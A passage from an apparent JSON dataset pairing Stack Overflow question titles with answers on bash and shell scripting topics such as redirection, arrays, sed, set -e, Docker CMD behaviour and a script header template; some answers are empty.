return a non-zero status. ! will negate it, so the line will end up returning a zero status and the script will continue normally.",
    "How to get the PID of a process by giving the process name in Mac OS X ?": "The answer above was mostly correct, just needed some tweaking for the different parameters in Mac OSX.\nps -A | grep [f]irefox | awk '{print $1}'",
    "How to suppress Terminated message after killing in bash?": "In order to silence the message, you must be redirecting stderr at the time the message is generated. Because the kill command sends a signal and doesn't wait for the target process to respond, redirecting stderr of the kill command does you no good. The bash builtin wait was made specifically for this purpose.\nHere is very simple example that kills the most recent background command. (Learn more about $! here.)\nkill $!\nwait $! 2>/dev/null\nBecause both kill and wait accept multiple pids, you can also do batch kills. Here is an example that kills all background processes (of the current process/script of course).\nkill $(jobs -rp)\nwait $(jobs -rp) 2>/dev/null\nI was led here from bash: silently kill background function process.",
    "I get 'Command Not Found' when I try to run Android Emulator on Mac OS X": "",
    "Escaping forward slashes in sed command [duplicate]": "I suggest to replace\nsed \"s/regex/replace/\" file\nwith\nsed \"s|regex|replace|\" file\nif your sed supports it. Then it is no longer necessary to escape the slashes.\nThe character directly after the s determines which character is the separator, which must appear three times in the s command.",
    "Shell: redirect stdout to /dev/null and stderr to stdout [duplicate]": "You want\n./script 2>&1 1>/dev/null | ./other-script\nThe order here is important. Let's assume stdin (fd 0), stdout (fd 1) and stderr (fd 2) are all connected to a tty initially, so\n0: /dev/tty, 1: /dev/tty, 2: /dev/tty\nThe first thing that gets set up is the pipe. other-script's stdin gets connected to the pipe, and script's stdout gets connected to the pipe, so script's file descriptors so far look like:\n0: /dev/tty, 1: pipe, 2: /dev/tty\nNext, the redirections occur, from left to right. 2>&1 makes fd 2 go wherever fd 1 is currently going, which is the pipe.\n0: /dev/tty, 1: pipe, 2: pipe\nLastly, 1>/dev/null redirects fd1 to /dev/null\n0: /dev/tty, 1: /dev/null, 2: pipe\nEnd result, script's stdout is silenced, and its stderr is sent through the pipe, which ends up in other-script's stdin.\nAlso see http://bash-hackers.org/wiki/doku.php/howto/redirection_tutorial\nAlso note that 1>/dev/null is synonymous to, but more explicit than >/dev/null",
    "How do I get the effect and usefulness of \"set -e\" inside a shell function?": "I eventually went with this, which apparently works. I tried the export method at first, but then found that I needed to export every global (constant) variable the script uses.\nDisable set -e, then run the function call inside a subshell that has set -e enabled. Save the exit status of the subshell in a variable, re-enable set -e, then test the var.\nf() { echo \"a\"; false;  echo \"Should NOT get HERE\"; }\n\n# Don't pipe the subshell into anything or we won't be able to see its exit status\nset +e ; ( set -e; f ) ; err_status=$?\nset -e\n\n## cleaner syntax which POSIX sh doesn't support.  Use bash/zsh/ksh/other fancy shells\nif ((err_status)) ; then\n    echo \"f returned false: $err_status\"\nfi\n\n## POSIX-sh features only (e.g. dash, /bin/sh)\nif test \"$err_status\" -ne 0 ; then\n    echo \"f returned false: $err_status\"\nfi\n\necho \"always print this\"\nYou can't run f as part of a pipeline, or as part of a && of || command list (except as the last command in the pipe or list), or as the condition in an if or while, or other contexts that ignore set -e. This code also can't be in any of those contexts, so if you use this in a function, callers have to use the same subshell / save-exit-status trickery. This use of set -e for semantics similar to throwing/catching exceptions is not really suitable for general use, given the limitations and hard-to-read syntax.\ntrap err_handler_function ERR has the same limitations as set -e, in that it won't fire for errors in contexts where set -e won't exit on failed commands.\nYou might think the following would work, but it doesn't:\nif ! ( set -e; f );then    ##### doesn't work, f runs ignoring -e\n    echo \"f returned false: $?\"\nfi\nset -e doesn't take effect inside the subshell because it remembers that it's inside the condition of an if. I thought being a subshell would change that, but only being in a separate file and running a whole separate shell on it would work.",
    "How to add line number for output, prompt for line, then act based on input?": "nl prints line numbers:\nls | grep android | nl",
    "Bash or KornShell (ksh)? [closed]": "The difference between Kornshell and Bash are minimal. There are certain advantages one has over the other, but the differences are tiny:\nBASH is much easier to set a prompt that displays the current directory. To do the same in Kornshell is hackish.\nKornshell has associative arrays and BASH doesn't. Now, the last time I used Associative arrays was... Let me think... Never.\nKornshell handles loop syntax a bit better. You can usually set a value in a Kornshell loop and have it available after the loop.\nBash handles getting exit codes from pipes in a cleaner way.\nKornshell has the print command which is way better than the echo command.\nBash has tab completions. In older versions\nKornshell has the r history command that allows me to quickly rerun older commands.\nKornshell has the syntax cd old new which replaces old with new in your directory and CDs over there. It's convenient when you have are in a directory called /foo/bar/barfoo/one/bar/bar/foo/bar and you need to cd to /foo/bar/barfoo/two/bar/bar/foo/bar In Kornshell, you can simply do cd one two and be done with it. In BASH, you'd have to cd ../../../../../two/bar/bar/foo/bar.\nI'm an old Kornshell guy because I learned Unix in the 1990s, and that was the shell of choice back then. I can use Bash, but I get frustrated by it at times because in habit I use some minor feature that Kornshell has that BASH doesn't and it doesn't work. So, whenever possible, I set Kornshell as my default.\nHowever, I am going to tell you to learn BASH. Bash is now implemented on most Unix systems as well as on Linux, and there are simply more resources available for learning BASH and getting help than Kornshell. If you need to do something exotic in BASH, you can go on Stackoverflow, post your question, and you'll get a dozen answers in a few minutes -- and some of them will even be correct!.\nIf you have a Kornshell question and post it on Stackoverflow, you'll have to wait for some old past their prime hacker like me wake up from his nap before you get an answer. And, forget getting any response if they're serving pudding up in the old age home that day.\nBASH is simply the shell of choice now, so if you've got to learn something, might as well go with what is popular.",
    "How to read a .properties file which contains keys that have a period character using Shell script": "I use simple grep inside function in bash script to receive properties from .properties file.\nThis properties file I use in two places - to setup dev environment and as application parameters.\nI believe that grep may work slow in big loops but it solves my needs when I want to prepare dev environment.\nHope, someone will find this useful.\nExample:\nFile: setup.sh\n#!/bin/bash\n\nENV=${1:-dev}\n\n# Reads the value of a property from a properties file.\n#\n# $1 - Key name, matched at beginning of line.\nfunction prop {\n    grep \"^${1}\" env/${ENV}.properties|cut -d'=' -f2\n}\n\ndocker create \\\n    --name=myapp-storage \\\n    -p $(prop 'app.storage.address'):$(prop 'app.storage.port'):9000 \\\n    -h $(prop 'app.storage.host') \\\n    -e STORAGE_ACCESS_KEY=\"$(prop 'app.storage.access-key')\" \\\n    -e STORAGE_SECRET_KEY=\"$(prop 'app.storage.secret-key')\" \\\n    -e STORAGE_BUCKET=\"$(prop 'app.storage.bucket')\" \\\n    -v \"$(prop 'app.data-path')/storage\":/app/storage \\\n    myapp-storage:latest\n\ndocker create \\\n    --name=myapp-database \\\n    -p \"$(prop 'app.database.address')\":\"$(prop 'app.database.port')\":5432 \\\n    -h \"$(prop 'app.database.host')\" \\\n    -e POSTGRES_USER=\"$(prop 'app.database.user')\" \\\n    -e POSTGRES_PASSWORD=\"$(prop 'app.database.pass')\" \\\n    -e POSTGRES_DB=\"$(prop 'app.database.main')\" \\\n    -e PGDATA=\"/app/database\" \\\n    -v \"$(prop 'app.data-path')/database\":/app/database \\\n    postgres:9.5\nFile: env/dev.properties\napp.data-path=/apps/myapp/\n\n#==========================================================\n# Server properties\n#==========================================================\napp.server.address=127.0.0.70\napp.server.host=dev.myapp.com\napp.server.port=8080\n\n#==========================================================\n# Backend properties\n#==========================================================\napp.backend.address=127.0.0.70\napp.backend.host=dev.myapp.com\napp.backend.port=8081\napp.backend.maximum.threads=5\n\n#==========================================================\n# Database properties\n#==========================================================\napp.database.address=127.0.0.70\napp.database.host=database.myapp.com\napp.database.port=5432\napp.database.user=dev-user-name\napp.database.pass=dev-password\napp.database.main=dev-database\n\n#==========================================================\n# Storage properties\n#==========================================================\napp.storage.address=127.0.0.70\napp.storage.host=storage.myapp.com\napp.storage.port=4569\napp.storage.endpoint=http://storage.myapp.com:4569\napp.storage.access-key=dev-access-key\napp.storage.secret-key=dev-secret-key\napp.storage.region=us-east-1\napp.storage.bucket=dev-bucket\nUsage:\n./setup.sh dev",
    "How to execute multiple queries using psql command from bash shell?": "-c processes only one command. Without it however psql expects commands to be passed into standard input, e.g.:\npsql -U postgres -h <ip_addr> <database_name> << EOF\nSELECT * FROM xyz_table;\nSELECT * FROM abc_table;\nEOF\nOr by using echo and pipes.",
    "How to match once per file in grep?": "So, using grep, you just need the option -l, --files-with-matches.\nAll those answers about find, awk or shell scripts are away from the question.",
    "Array of arrays in bash": "Bash has no support for multidimensional arrays. Try\narray=(a b c d)\necho ${array[1]}\necho ${array[1][3]}\necho ${array[1]exit}\nFor tricks how to simulate them, see Advanced Bash Scripting Guide.\nThe output of the 3 echo commands is:\nb\nbash: ${array[1][3]}: bad substitution\nbash: ${array[1]exit}: bad substitution",
    "GIT get the commit hash prior to a specific commit": "Use git show HEAD^1. You can replace HEAD with your commit-hash\nEdit to take multiple parents into account:\nIn case you want to see all the parents for a commit hash, you can use git rev-list --parents -n 1 <commithash> or use git show as @Bhaskar suggested in the comments to the question.\nThere are other ways as well as explained here.",
    "How to get osx shell script to show colors in echo": "Use \\033 or \\x1B instead of \\e to represent the <Esc> character.\necho -e \"\\033[1;31m This is red text \\033[0m\"\nSee http://misc.flogisoft.com/bash/tip_colors_and_formatting",
    "A Python script that activates the virtualenv and then runs another Python script?": "You can activate your virtualenv and then start server using a bat file. Copy this script in to a file and save it with .bat extension (eg. runserver.bat)\n@echo off\ncmd /k \"cd /d C:\\Users\\Admin\\Desktop\\venv\\Scripts & activate & cd /d    C:\\Users\\Admin\\Desktop\\helloworld & python manage.py runserver\"\nThen you can just run this bat file (just double click) to start the server",
    "Echo string to .txt file with multiple lines - with Windows Batch file": "(\necho Here is my first line\necho Here is my second line\necho Here is my third line\n)>\"myNewTextFile.txt\"\npause",
    "How do you run a script on login in *nix?": "From wikipedia Bash\nWhen Bash starts, it executes the commands in a variety of different scripts.\nWhen Bash is invoked as an interactive login shell, it first reads and executes commands from the file /etc/profile, if that file exists. After reading that file, it looks for ~/.bash_profile, ~/.bash_login, and ~/.profile, in that order, and reads and executes commands from the first one that exists and is readable.\nWhen a login shell exits, Bash reads and executes commands from the file ~/.bash_logout, if it exists.\nWhen an interactive shell that is not a login shell is started, Bash reads and executes commands from ~/.bashrc, if that file exists. This may be inhibited by using the --norc option. The --rcfile file option will force Bash to read and execute commands from file instead of ~/.bashrc.",
    "How to input a path with a white space?": "Use one of these threee variants:\nSOME_PATH=\"/mnt/someProject/some path\"\nSOME_PATH='/mnt/someProject/some path'\nSOME_PATH=/mnt/someProject/some\\ path",
    "adb remount permission denied, but able to access super user in shell -- android": "",
    "Multi-dimensional arrays in Bash": "Bash does not support multidimensional arrays, nor hashes, and it seems that you want a hash that values are arrays. This solution is not very beautiful, a solution with an xml file should be better :\narray=('d1=(v1 v2 v3)' 'd2=(v1 v2 v3)')\nfor elt in \"${array[@]}\";do eval $elt;done\necho \"d1 ${#d1[@]} ${d1[@]}\"\necho \"d2 ${#d2[@]} ${d2[@]}\"\nEDIT: this answer is quite old, since since bash 4 supports hash tables, see also this answer for a solution without eval.",
    "rm fails to delete files by wildcard from a script, but works from a shell prompt": "TL;DR\nQuote only the variable, not the whole expected path with the wildcard\nrm \"$archivedir\"/*.bz2\nExplanation\nIn Unix, programs generally do not interpret wildcards themselves. The shell interprets unquoted wildcards, and replaces each wildcard argument with a list of matching file names. if $archivedir might contain spaces, then rm $archivedir/*.bz2 might not do what you\nYou can disable this process by quoting the wildcard character, using double or single quotes, or a backslash before it. However, that's not what you want here - you do want the wildcard expanded to the list of files that it matches.\nBe careful about writing rm $archivedir/*.bz2 (without quotes). The word splitting (i.e., breaking the command line up into arguments) happens after $archivedir is substituted. So if $archivedir contains spaces, then you'll get extra arguments that you weren't intending. Say archivedir is /var/archives/monthly/April to June. Then you'll get the equivalent of writing rm /var/archives/monthly/April to June/*.bz2, which tries to delete the files \"/var/archives/monthly/April\", \"to\", and all files matching \"June/*.bz2\", which isn't what you want.\nThe correct solution is to write:\nrm \"$archivedir\"/*.bz2",
    "source all files in a directory from .bash_profile": "Wouldn't\n for f in ~/.bash_profile_*; do source $f; done\nbe sufficient?\nEdit: Extra layer of ls ~/.bash_* simplified to direct bash globbing.",
    "How to get all process ids without ps command on Linux": "Further to the comment by @FelixJongleur42, the command\nls -l /proc/*/exe\nyields a parseable output with additional info such as the process user, start time and command.",
    "What is an easy way to do a sorted diff between two files?": "This redirection syntax is bash specific. Thus it won't work in tcsh.\nYou can call bash and specify the command directly:\nbash -c 'diff <(sort text2) <(sort text1)'",
    "Redirecting output of bash for loop": "Remove your semicolon.\nfor i in `seq 2`; do echo \"$i\"; done > out.dat\nSUGGESTIONS\nAlso as suggested by Fredrik Pihl, try not to use external binaries when they are not needed, or at least when practically not:\nfor i in {1..2}; do echo \"$i\"; done > out.dat\nfor (( i = 1; i <= 2; ++i )); do echo \"$i\"; done > out.dat\nfor i in 1 2; do echo \"$i\"; done > out.dat\nAlso, be careful of outputs in words that may cause pathname expansion.\nfor a in $(echo '*'); do echo \"$a\"; done\nWould show your files instead of just a literal *.\n$() is also recommended as a clearer syntax for command substitution in Bash and POSIX shells than backticks (`), and it supports nesting.\nThe cleaner solutions as well for reading output to variables are\nwhile read var; do\n    ...   \ndone < <(do something)\nAnd\nread ... < <(do something)  ## Could be done on a loop or with readarray.\n\nfor a in \"${array[@]}\"; do\n    :\ndone\nUsing printf can also be an easier alternative with respect to the intended function:\nprintf '%s\\n' {1..2} > out.dat",
    "What is the difference between $@ and $* in shell scripts?": "From here:\n$@ behaves like $* except that when quoted the arguments are broken up properly if there are spaces in them.\nTake this script for example (taken from the linked answer):\nfor var in \"$@\"\ndo\n    echo \"$var\"\ndone\nGives this:\n$ sh test.sh 1 2 '3 4'\n1\n2\n3 4\nNow change \"$@\" to $*:\nfor var in $*\ndo\n    echo \"$var\"\ndone\nAnd you get this:\n$ sh test.sh 1 2 '3 4'\n1\n2\n3\n4\n(Answer found by using Google)",
    "DIR=\"$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\" How does that work?": "Bash maintains a number of variables including BASH_SOURCE which is an array of source file pathnames.\n${} acts as a kind of quoting for variables.\n$() acts as a kind of quoting for commands but they're run in their own context.\ndirname gives you the path portion of the provided argument.\ncd changes the current directory.\npwd gives the current path.\n&& is a logical and but is used in this instance for its side effect of running commands one after another.\nIn summary, that command gets the script's source file pathname, strips it to just the path portion, cds to that path, then uses pwd to return the (effectively) full path of the script. This is assigned to DIR. After all of that, the context is unwound so you end up back in the directory you started at but with an environment variable DIR containing the script's path.",
    "ssh script returns 255 error": "This is usually happens when the remote is down/unavailable; or the remote machine doesn't have ssh installed; or a firewall doesn't allow a connection to be established to the remote host.\nssh returns 255 when an error occurred or 255 is returned by the remote script:\n EXIT STATUS\n\n     ssh exits with the exit status of the remote command or\n     with 255 if an error occurred.\nUsually you would an error message something similar to:\nssh: connect to host host.domain.com port 22: No route to host\nOr\nssh: connect to host HOSTNAME port 22: Connection refused\nCheck-list:\nWhat happens if you run the ssh command directly from the command line?\nAre you able to ping that machine?\nDoes the remote has ssh installed?\nIf installed, then is the ssh service running?",
    "Hidden features of Bash": "insert preceding line's final parameter\nalt-. the most useful key combination ever, try it and see, for some reason no one knows about this one.\npress it again and again to select older last parameters.\ngreat when you want to do something else to something you used just a moment ago.",
    "Run multiple python scripts concurrently": "With Bash:\npython script1.py &\npython script2.py &\nThat's the entire script. It will run the two Python scripts at the same time.\nPython could do the same thing itself but it would take a lot more typing and is a bad choice for the problem at hand.\nI think it's possible though that you are taking the wrong approach to solving your problem, and I'd like to hear what you're getting at.",
    "How to remove trailing whitespaces for multiple files?": "You want\nsed --in-place 's/[[:space:]]\\+$//' file\nThat will delete all POSIX standard defined whitespace characters, including vertical tab and form feed. Also, it will only do a replacement if the trailing whitespace actually exists, unlike the other answers that use the zero or more matcher (*).\n--in-place is simply the long form of -i. I prefer to use the long form in scripts because it tends to be more illustrative of what the flag actually does.\nIt can be easily integrated with find like so:\nfind . -type f -name '*.txt' -exec sed --in-place 's/[[:space:]]\\+$//' {} \\+\nIf you're on a Mac\nAs pointed out in the comments, the above doesn't work if you don't have gnu tools installed. If that's the case, you can use the following:\nfind . -iname '*.txt' -type f -exec sed -i '' 's/[[:space:]]\\{1,\\}$//' {} \\+",
    "How to parse XML using shellscript? [duplicate]": "You could try xmllint\nThe xmllint program parses one or more XML files, specified on the command line as xmlfile. It prints various types of output, depending upon the options selected. It is useful for detecting errors both in XML code and in the XML parser itse\nIt allows you select elements in the XML doc by xpath, using the --pattern option.\nOn Mac OS X (Yosemite), it is installed by default.\nOn Ubuntu, if it is not already installed, you can run apt-get install libxml2-utils",
    "How to copy and edit files in Android shell?": "",
    "How to get the last line of a file using cat command": "Don't use cat. tail was meant for this usecase exactly:\n$ tail -1 ./test.properties",
    "Shell script variable not empty (-z option)": "Of course it does. After replacing the variable, it reads [ !-z ], which is not a valid [ command. Use double quotes, or [[.\nif [ ! -z \"$errorstatus\" ]\n\nif [[ ! -z $errorstatus ]]",
    "self-deleting shell script": "rm -- \"$0\"\nOught to do the trick. $0 is a magic variable for the full path of the executed script.",
    "Subtract days from a date in Bash": "You are specifying the date incorrectly. Instead, say:\ndate --date=\"${dataset_date} -${date_diff} day\" +%Y-%m-%d\nIf you need to store it in a variable, use $(...):\np_dataset_date=$(date --date=\"${dataset_date} -${date_diff} day\" +%Y-%m-%d)",
    "Inline if shell script": "It doesn't work because you missed out fi to end your if statement.\ncounter=`ps -ef | grep -c \"myApplication\"`; if [ $counter -eq 1 ]; then echo \"true\"; fi\nYou can shorten it further using:\nif [ $(ps -ef | grep -c \"myApplication\") -eq 1 ]; then echo \"true\"; fi\nAlso, do take note the issue of ps -ef | grep ... matching itself as mentioned in @DigitalRoss' answer.\nupdate\nIn fact, you can do one better by using pgrep:\nif [ $(pgrep -c \"myApplication\") -eq 1 ]; then echo \"true\"; fi",
    "How to execute a shell script from C in Linux?": "It depends on what you want to do with the script (or any other program you want to run).\nIf you just want to run the script system is the easiest thing to do, but it does some other stuff too, including running a shell and having it run the command (/bin/sh under most *nix).\nIf you want to either feed the shell script via its standard input or consume its standard output you can use popen (and pclose) to set up a pipe. This also uses the shell (/bin/sh under most *nix) to run the command.\nBoth of these are library functions that do a lot under the hood, but if they don't meet your needs (or you just want to experiment and learn) you can also use system calls directly. This also allows you do avoid having the shell (/bin/sh) run your command for you.\nThe system calls of interest are fork, execve, and waitpid. You may want to use one of the library wrappers around execve (type man 3 exec for a list of them). You may also want to use one of the other wait functions (man 2 wait has them all). Additionally you may be interested in the system calls clone and vfork which are related to fork.\nfork duplicates the current program, where the only main difference is that the new process gets 0 returned from the call to fork. The parent process gets the new process's process id (or an error) returned.\nexecve replaces the current program with a new program (keeping the same process id).\nwaitpid is used by a parent process to wait on a particular child process to finish.\nHaving the fork and execve steps separate allows programs to do some setup for the new process before it is created (without messing up itself). These include changing standard input, output, and stderr to be different files than the parent process used, changing the user or group of the process, closing files that the child won't need, changing the session, or changing the environmental variables.\nYou may also be interested in the pipe and dup2 system calls. pipe creates a pipe (with both an input and an output file descriptor). dup2 duplicates a file descriptor as a specific file descriptor (dup is similar but duplicates a file descriptor to the lowest available file descriptor).",
    "What does 2 commas after variable name mean in bash?": "This is called \"Parameter Expansion\" available in bash version 4+ . To change the case of the string stored in the variable to lower case.Eg:\nvar=HeyThere\necho ${var,,}\nheythere\nYou may want to try some additional commands and check the effect:\n${var^}\n${var^^}\n${var,}\n${var,,}\nNote: \"Parameter Expansion\" is present in man bash .Search for it.\nhttps://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Shell-Parameter-Expansion",
    "Send a ping to each IP on a subnet": "Not all machines have nmap available, but it's a wonderful tool for any network discovery, and certainly better than iterating through independent ping commands.\n$ nmap -n -sP 10.0.0.0/24\n\nStarting Nmap 4.20 ( http://insecure.org ) at 2009-02-02 07:41 CST\nHost 10.0.0.1 appears to be up.\nHost 10.0.0.10 appears to be up.\nHost 10.0.0.104 appears to be up.\nHost 10.0.0.124 appears to be up.\nHost 10.0.0.125 appears to be up.\nHost 10.0.0.129 appears to be up.\nNmap finished: 256 IP addresses (6 hosts up) scanned in 2.365 seconds",
    "How can I list all vhosts in nginx": "starting from version 1.9.2 you can do:\nnginx -T\nshow complete nginx configuration\nnginx -T | grep \"server_name \" #include the whitespace to exclude non relevant results\nshow you all server names",
    "How to turn off Wifi via ADB?": "",
    "In a bash script/command how can I make a PC beep noise, or play a sound file?": "This will make a beep from within bash\necho -en \"\\007\"",
    "How to check if a group exists and add if it doesn't in Linux Shell Script": "The grep statement in the solution of rups has some flaws:\nE.g. grepping for a group admin may return true (\"group exists\") when there is a group lpadmin.\nEither fix the grep-query\ngrep -q -E \"^admin:\" /etc/group\nor use\nif [ $(getent group admin) ]; then\n  echo \"group exists.\"\nelse\n  echo \"group does not exist.\"\nfi",
    "What is the preferred method to echo a blank line in a shell script?": "echo is preferred. echo \" \" outputs an unnecessary space character. echo \"\" would be better, but it's unnecessary.",
    "Move top 1000 lines from text file to a new file using Unix shell commands": "head -1000 input > output && sed -i '1,+999d' input\nFor example:\n$ cat input \n1\n2\n3\n4\n5\n6\n$ head -3 input > output && sed -i '1,+2d' input\n$ cat input \n4\n5\n6\n$ cat output \n1\n2\n3",
    "How do I know if I'm running a nested shell?": "The $SHLVL variable tracks your shell nesting level:\n$ echo $SHLVL\n1\n$ bash\n$ echo $SHLVL\n2\n$ exit\n$ echo $SHLVL\n1\nAs an alternative to spawning sub-shells you could push and pop directories from the stack and stay in the same shell:\n[root@localhost /old/dir]# pushd /new/dir\n/new/dir /old/dir\n[root@localhost /new/dir]# popd\n/old/dir\n[root@localhost /old/dir]#",
    "How to check if a file is binary?": "Use utility file, sample usage:\n $ file /bin/bash\n /bin/bash: Mach-O universal binary with 2 architectures\n /bin/bash (for architecture x86_64):   Mach-O 64-bit executable x86_64\n /bin/bash (for architecture i386): Mach-O executable i386\n\n $ file /etc/passwd\n /etc/passwd: ASCII English text\n\n $ file code.c\n code.c: ASCII c program text\nfile manual page",
    "decode base64: invalid input": "That version will not decode (by default) lines with separators, yet the encoder does that by default. (Newer versions don't have this problem.)\nOne solution:\nbase64 -w 0 foo.zip | base64 -d > foo2.zip\nAlternate:\nbase64 foo.zip | base64 -di > foo2.zip\nThe -i option stands for (from the man page):\n-i, --ignore-garbage\n       When decoding, ignore non-alphabet characters.\n[...]\nDecoding require compliant input by default, use --ignore-garbage to\nattempt to recover from non-alphabet characters (such as newlines)",
    "How do I extract the created date out of a Mongo ObjectID": "getTimestamp()\nThe function you need is this one, it's included for you already in the shell:\nObjectId.prototype.getTimestamp = function() {\n    return new Date(parseInt(this.toString().slice(0,8), 16)*1000);\n}\nReferences\nCheck out this section from the docs:\nExtract insertion times from _id rather than having a separate timestamp field\nThis unit test also demostrates the same:\nmongo / jstests / objid6.js\nExample using the Mongo shell:\n> db.col.insert( { name: \"Foo\" } );\n> var doc = db.col.findOne( { name: \"Foo\" } );\n> var timestamp = doc._id.getTimestamp();\n\n> print(timestamp);\nWed Sep 07 2011 18:37:37 GMT+1000 (AUS Eastern Standard Time)\n\n> printjson(timestamp);\nISODate(\"2011-09-07T08:37:37Z\")",
    "Dockerfile CMD instruction will exit the container just after running it": "A docker container will run as long as the CMD from your Dockerfile takes.\nIn your case your CMD consists of a shell script containing a single echo. So the container will exit after completing the echo.\nYou can override CMD, for example:\nsudo docker run -it --entrypoint=/bin/bash <imagename>\nThis will start an interactive shell in your container instead of executing your CMD. Your container will exit as soon as you exit that shell.\nIf you want your container to remain active, you have to ensure that your CMD keeps running. For instance, by adding the line while true; do sleep 1; done to your shell.sh file, your container will print your hello message and then do nothing any more until you stop it (using docker stop in another terminal).\nYou can open a shell in the running container using docker exec -it <containername> bash. If you then execute command ps ax, it will show you that your shell.sh is still running inside the container.",
    "Avoid gnome-terminal close after script execution? [closed]": "Let gnome-terminal run bash and tell bash to run your commands and then start a new bash:\n$ gnome-terminal -- bash -c \"echo foo; echo bar; exec bash\"\nexplanation:\ngnome terminal runs bash ...\n$ gnome-terminal -- bash -c \"echo foo; echo bar; exec bash\"\n                    ^^^^\nwhich runs your commands ...\n$ gnome-terminal -- bash -c \"echo foo; echo bar; exec bash\"\n                             ^^^^^^^^  ^^^^^^^^\nand then reexecutes bash.\n$ gnome-terminal -- bash -c \"echo foo; echo bar; exec bash\"\n                                                 ^^^^^^^^^\ngnome terminal will not close if something is still running. in this case the second bash is still running. this makes gnome terminal not close and you can interact with bash inside gnome terminal as normal.\nif the commands are many or complex you can put them in a script:\n$ gnome-terminal -- bash -c \"./scripttorun; exec bash\"\n\n                             ^^^^^^^^^^^^^\nadvantage: you have the script ready to be run manualy outside of this gnome-terminal construct.\nalternative:\nyou can also reexecute bash in the script directly\nPrepare scripttobash:\n#!/bin/sh\necho foo\necho bar\nexec bash\nThen run:\n$ gnome-terminal -- ./scripttobash\nthe advantage is the gnome terminal command became quite simple.\nthe disadvantage is that the script now always runs a second bash. which means you cannot run the script independently. well actually you can but the second bash might cause confusion.\nalternative:\nuse --rcfile to run a custom startup configuration containing your commands.\nexample somercfile:\nsource ~/.bashrc\necho foo\necho bar\nThen run:\n$ gnome-terminal -- bash --rcfile somercfile\nbash will stay open afterwards. but i am not entirely sure about other side effects this might have.\nfor completeness:\nthere is an option to keep gnome terminal open after executing the command. but you will not be able to interact anymore. just read the output.\ngo to preferences (hamburger button -> preferences)\ngo to profiles (i recommend to create a new profile for this case)\ngo to command tab\nset \"when command exits\" to \"hold the terminal open\"\nif you created a new profile you can use it like this:\ngnome-terminal --profile=holdopen -- ./scripttorun\nclosing words:\nEvery method has it's quirks. You must choose, but choose wisely.\nI like the first solution. it does not need extra files or profiles. and the command says what it does: run commands then run bash again.\nAll that said, since you used ssh in your example, you might want to take a look at pssh (parallel ssh). here an article: https://www.cyberciti.biz/cloud-computing/how-to-use-pssh-parallel-ssh-program-on-linux-unix/",
    "How to remove all non-numeric characters from a string in Bash?": "This is one way with sed:\n$ echo $file | sed 's/[^0-9]*//g' \n123\n$ echo \"123 he23llo\" | sed 's/[^0-9]*//g'\n12323\nOr with pure bash:\n$ echo \"${file//[!0-9]/}\" \n123\n$ file=\"123 hello 12345 aaa\"\n$ echo \"${file//[!0-9]/}\" \n12312345\nTo save the result into the variable itself, do\n$ file=$(echo $file | sed 's/[^0-9]*//g')\n$ echo $file\n123\n\n$ file=${file//[!0-9]/}\n$ echo $file\n123",
    "total size of group of files selected with 'find'": "The command du tells you about disk usage. Example usage for your specific case:\nfind rapidly_shrinking_drive/ -name \"offender1\" -mtime -1 -print0 | du --files0-from=- -hc | tail -n1\n(Previously I wrote du -hs, but on my machine that appears to disregard find's input and instead summarises the size of the cwd.)",
    "How to concatenate arrays in bash?": "First, to read your list into an array, one entry per line:\nreadarray -t countries\n...or, with older versions of bash:\n# same, but compatible with bash 3.x; || is to avoid non-zero exit status.\nIFS=$'\\n' read -r -d '' countries || (( ${#countries[@]} ))\nSecond, to duplicate the entries, either expand the array to itself three times:\ncountries=( \"${countries[@]}\" \"${countries[@]}\" \"${countries[@]}\" )\n...or use the modern syntax for performing an append:\ncountries+=( \"${countries[@]}\" \"${countries[@]}\" )",
    "Run one command after another, even if I suspend the first one (Ctrl-z)": "The following should do it:\n(command1; command2)\nNote the added parentheses.",
    "Shell script common template [duplicate]": "This is the header of my script shell template (which can be found here: http://www.uxora.com/unix/shell-script/18-shell-script-template).\nIt is a man look alike which is used to by usage() to diplsay help as well.\n#!/bin/ksh\n#================================================================\n# HEADER\n#================================================================\n#% SYNOPSIS\n#+    ${SCRIPT_NAME} [-hv] [-o[file]] args ...\n#%\n#% DESCRIPTION\n#%    This is a script template\n#%    to start any good shell script.\n#%\n#% OPTIONS\n#%    -o [file], --output=[file]    Set log file (default=/dev/null)\n#%                                  use DEFAULT keyword to autoname file\n#%                                  The default value is /dev/null.\n#%    -t, --timelog                 Add timestamp to log (\"+%y/%m/%d@%H:%M:%S\")\n#%    -x, --ignorelock              Ignore if lock file exists\n#%    -h, --help                    Print this help\n#%    -v, --version                 Print script information\n#%\n#% EXAMPLES\n#%    ${SCRIPT_NAME} -o DEFAULT arg1 arg2\n#%\n#================================================================\n#- IMPLEMENTATION\n#-    version         ${SCRIPT_NAME} (www.uxora.com) 0.0.4\n#-    author          Michel VONGVILAY\n#-    copyright       Copyright (c) http://www.uxora.com\n#-    license         GNU General Public License\n#-    script_id       12345\n#-\n#================================================================\n#  HISTORY\n#     2015/03/01 : mvongvilay : Script creation\n#     2015/04/01 : mvongvilay : Add long options and improvements\n# \n#================================================================\n#  DEBUG OPTION\n#    set -n  # Uncomment to check your syntax, without execution.\n#    set -x  # Uncomment to debug this shell script\n#\n#================================================================\n# END_OF_HEADER\n#================================================================\nAnd here is the usage functions to go with:\n  #== needed variables ==#\nSCRIPT_HEADSIZE=$(head -200 ${0} |grep -n \"^# END_OF_HEADER\" | cut -f1 -d:)\nSCRIPT_NAME=\"$(basename ${0})\"\n\n  #== usage functions ==#\nusage() { printf \"Usage: \"; head -${SCRIPT_HEADSIZE:-99} ${0} | grep -e \"^#+\" | sed -e \"s/^#+[ ]*//g\" -e \"s/\\${SCRIPT_NAME}/${SCRIPT_NAME}/g\" ; }\nusagefull() { head -${SCRIPT_HEADSIZE:-99} ${0} | grep -e \"^#[%+-]\" | sed -e \"s/^#[%+-]//g\" -e \"s/\\${SCRIPT_NAME}/${SCRIPT_NAME}/g\" ; }\nscriptinfo() { head -${SCRIPT_HEADSIZE:-99} ${0} | grep -e \"^#-\" | sed -e \"s/^#-//g\" -e \"s/\\${SCRIPT_NAME}/${SCRIPT_NAME}/g\"; }\nHere is what you should obtain:\n# Display help\n$ ./template.sh --help\n\n    SYNOPSIS\n    template.sh [-hv] [-o[file]] args ...\n\n    DESCRIPTION\n    This is a script template\n    to start any good shell script.\n\n    OPTIONS\n    -o [file], --output=[file]    Set log file (default=/dev/null)\n                                  use DEFAULT keyword to autoname file\n                                  The default value is /dev/null.\n    -t, --timelog                 Add timestamp to log (\"+%y/%m/%d@%H:%M:%S\")\n    -x, --ignorelock              Ignore if lock 